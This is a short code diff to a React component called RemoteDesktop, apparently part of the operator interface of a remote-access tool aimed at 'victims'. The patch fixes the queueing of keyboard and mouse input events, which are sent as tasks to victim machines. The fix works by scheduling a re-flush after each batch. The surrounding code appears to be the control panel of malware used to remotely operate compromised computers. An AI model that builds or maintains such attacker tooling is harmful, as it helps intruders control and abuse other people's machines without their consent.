@@ -120,7 +120,10 @@ export function RemoteDesktop({ victim }: { victim: Victim }) {
     flushing.current = true;
     try {
       await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'input:batch', params: { events }, timeout_sec: 10 });
-    } catch { /* el siguiente gesto reintenta */ } finally { flushing.current = false; }
+    } catch { /* el siguiente gesto reintenta */ } finally {
+      flushing.current = false;
+      if (queue.current.length > 0) setTimeout(() => void flush(), 0);
+    }
   }, [victim.id]);
 
   const enqueue = useCallback((event: Record<string, unknown>, immediate = false) => {
